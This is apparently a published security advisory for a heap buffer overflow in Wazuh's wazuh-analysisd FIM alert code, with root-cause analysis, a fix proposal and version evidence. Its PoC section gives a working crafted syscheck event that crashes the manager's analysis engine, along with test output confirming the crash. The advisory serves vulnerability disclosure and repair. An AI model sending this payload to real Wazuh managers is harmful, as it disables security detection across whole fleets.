Heap buffer overflow in wazuh-analysisd fim_generate_alert() lets an enrolled agent corrupt manager heap memory and terminate the analysis engine

High
juliamagan published GHSA-gc4j-j9fg-4cfr Oct 13, 2026

Package

wazuh-manager

Affected versions

>= 3.12.0

Patched versions

4.14.8

Description

Summary

An enrolled Wazuh agent can send a single crafted FIM (syscheck) event that causes wazuh-analysisd — running as root on the manager — to write past the end of a heap allocation with attacker-influenced content. A handful of such events deterministically terminates wazuh-analysisd, the component that evaluates every rule for every agent, producing a fleet-wide detection outage the attacker can trigger on demand.

Scope, stated plainly: what is demonstrated here is the out-of-bounds write, corruption of adjacent heap data visible in program output, and a deterministic remote crash. Control-flow hijack was not developed and this report does not claim remote code execution.

Details

Root cause: an allocation sized from the input, then written bounded by an unrelated constant.

lf->full_log is allocated once, sized from the input length — src/analysisd/cleanevent.c:59-62:

    loglen = strlen(pieces) + 1;
 
    /* Assign the values in the structure (lf->full_log) */
    os_malloc((2 * loglen) + 1, lf->full_log);

So the buffer is 2·strlen(input) + 3 bytes.

The FIM alert text is later written into that same buffer, bounded by OS_MAXSTR (65535) — not by the allocation — src/analysisd/decoders/syscheck.c:1680:

    snprintf(lf->full_log, OS_MAXSTR,
            "%s '%s' %s\n"
            "%s"
            "Mode: %s\n"
            "%s"
            "%s%s%s%s%s%s%s%s%s%s%s%s",
            ...

Nothing re-allocates full_log on the JSON-FIM path between the allocation and this snprintf. Whenever the generated alert is longer than 2·strlen(input)+3, snprintf — told the buffer is 65535 bytes when it is 459 — writes the excess out of bounds.

Why the output exceeds the input (by design):

The generated alert text is inflated relative to the input:

  • the twelve fixed-text fim_generate_comment strings (syscheck.c:1604-1618), each of which fires when old_attributes is absent, e.g. "Old md5sum was: '%s'\nNew md5sum is : '%s'\n", "Old modification time was: '%s', now it is '%s'\n", etc. — the 12 trailing %s in the snprintf template at line 1680;
  • w_long_str expanding JSON exponent notation — 9e18 (4 chars in) → 9000000000000000000 (19 chars out), applied to size/mtime/inode for both the before and after fields;
  • the synthetic "Unknown key:Unknown Value" filler emitted for a registry_value with no value name.
    A compact registry_value modification with no old_attributes therefore yields far more output than input: 228 bytes in → 459-byte allocation → ~506 bytes written ≈ 47 bytes out of bounds.

The sink is not gated behind the database write. fim_generate_alert() is called at syscheck.c:1436 and fim_send_db_save() only afterward, with the alert function's return value unchecked:

    fim_generate_alert(lf, event_type, attributes, old_attributes, audit);   /* sink at line 1680 */
 
    if (event_type == FIM_ADDED || event_type == FIM_MODIFIED) {
        fim_send_db_save(sdb, lf->agent_id, event);                          /* runs after the sink */

The correct pattern already exists in the same file. On the checksum-comparison path, full_log is freed and reallocated to fit the generated text before use — syscheck.c:842-843:

    free(lf->full_log);
    os_strdup(localsdb->comment, lf->full_log);

The JSON-FIM path at line 1680 simply omits this free-and-resize step. The defect is a missing reallocation, not a design question, and the fix is the pattern already used 800 lines above.

PoC

From an enrolled agent (or any writer to the manager's local queue), send:

8:syscheck:{"type":"event","data":{"type":"modified","path":"a","attributes":{"type":"registry_value","size":9e18,"perm":"a","uid":"a","gid":"a","mtime":9e18,"inode":9e18,"hash_md5":"a","hash_sha1":"a","hash_sha256":"a","attributes":"a"}}}

Control (isolates the size relationship — same fields, larger input, therefore larger allocation): add "mode":"scheduled" and a full "old_attributes":{...} object. This survives indefinitely.

Optional allocator instrumentation makes the corruption abort immediately instead of latently:

LD_PRELOAD=/usr/lib64/libc_malloc_debug.so.0 GLIBC_TUNABLES=glibc.malloc.check=3 \
  /var/ossec/bin/wazuh-analysisd -f

Controlled A/B on a 4.14.x manager, repeated twice:

=========== ROUND 1 ===========
[control] mode=control  N=416  alloc=2N+3=835  msgs=300
[control] analysisd after : 1     -> survived
 
[exploit] mode=exploit  N=228  alloc=2N+3=459
[exploit] analysisd after : 0     -> ANALYSISD DIED
 
=========== ROUND 2 ===========
[control] analysisd after : 1     -> survived (300 events)
[exploit] analysisd after : 0     -> ANALYSISD DIED

300 control events leave the daemon healthy; a handful of exploit events kill it — the exact count is heap-layout dependent (single digits across runs; 3–4 under glibc allocator checking, because the corruption is then caught at free() rather than staying latent). The only variable between control and exploit is the size relationship.

Adjacent-heap corruption is directly observable in the manager log — garbage bleeding into a neighbouring field:

wazuh-analysisd: ERROR: FIM decoder: Bad response from database: Invalid agent ID 'ere:'

Remote reachability, from a real enrolled agent over the encrypted 1514 channel, against the full product (wazuh-docker single-node: manager + indexer + dashboard):

   Wazuh agent_control. List of available agents:
      ID: 000, Name: wazuh.manager (server), IP: 127.0.0.1, Active/Local
      ID: 001, Name: 5c6c302bdc88,          IP: any,       Active
 
   manager analysisd before: 1
   mode=exploit  N=228  alloc=2N+3=459  msgs=60      sent 60
   manager analysisd after : 0

The agent was enrolled normally with agent-auth; the payload was written to the agent's own local queue and forwarded by wazuh-agentd over the encrypted channel. No manager-side access was used.

Impact

wazuh-analysisd is the correlation engine. Terminating it stops alert generation for the entire deployment. Any single compromised endpoint holding a valid agent key — the least-trusted component that legitimately talks to a manager — can do this on demand, immediately before or during other activity, and the outage presents as instability rather than as an attack.

The out-of-bounds write itself is attacker-sized and attacker-filled, in a root process, on a network-reachable path. Every allocation on this path is derived from attacker input, which makes heap grooming tractable; that was not attempted, and the severity reflects only what is proven (out-of-bounds write + adjacent-heap corruption + deterministic remote DoS).

Relationship to CVE-2026-34150 (not a duplicate)

CVE-2026-34150 / GHSA-rvr9-89q8-w883 is also a heap buffer overflow in wazuh-analysisd, but in src/analysisd/format/json_extended.c :: W_JSON_ParseRootcheck — a fixed 30-byte malloc written by an unbounded sprintf, reached through rootcheck events, fixed in 4.14.5.

This report is a different function (decoders/syscheck.c:1680), a different decoder path (JSON FIM), and a different root cause (an allocation derived from input length in cleanevent.c:62, then written bounded by the unrelated constant OS_MAXSTR). The 4.14.5 fix does not touch this code, which is unchanged through 4.14.7 (both files are byte-identical between 4.14.6 and 4.14.7 — see below).

CVE-2026-34150 is noted only for severity calibration: its demonstrated impact was likewise "crashes wazuh-analysisd", and Wazuh rated it High.

Version evidence

Both halves of the defect are present unchanged across releases (verified by fetching each tag's source):

  • cleanevent.c — input-sized os_malloc((2 * loglen) + 1, lf->full_log): present in v4.0.0 … v4.14.7.
  • syscheck.c — snprintf(lf->full_log, OS_MAXSTR, …) sink: present in v4.0.0 … v4.14.7.
  • src/analysisd/cleanevent.c and src/analysisd/decoders/syscheck.c are byte-identical between 4.14.6 and 4.14.7:
    • cleanevent.c md5 105425344ec34f369d13cab448fce8f2
    • syscheck.c md5 88a4aa1472f1e9ad32f2ffcaebc30c01

Recommended fix

Size the buffer for the output, not the input, on the JSON-FIM path. Either:

  1. mirror the existing checksum-path pattern (syscheck.c:842-843): free(lf->full_log); os_strdup(...), or reallocate lf->full_log to the required length before the snprintf in fim_generate_alert() (compute it with a snprintf(NULL, 0, ...) sizing pass); or
  2. track the allocated size on Eventinfo and pass that to snprintf instead of OS_MAXSTR — this option alone converts the overflow into truncation.
    The same OS_MAXSTR-versus-actual-allocation mismatch should be swept for across the other lf->full_log writers.
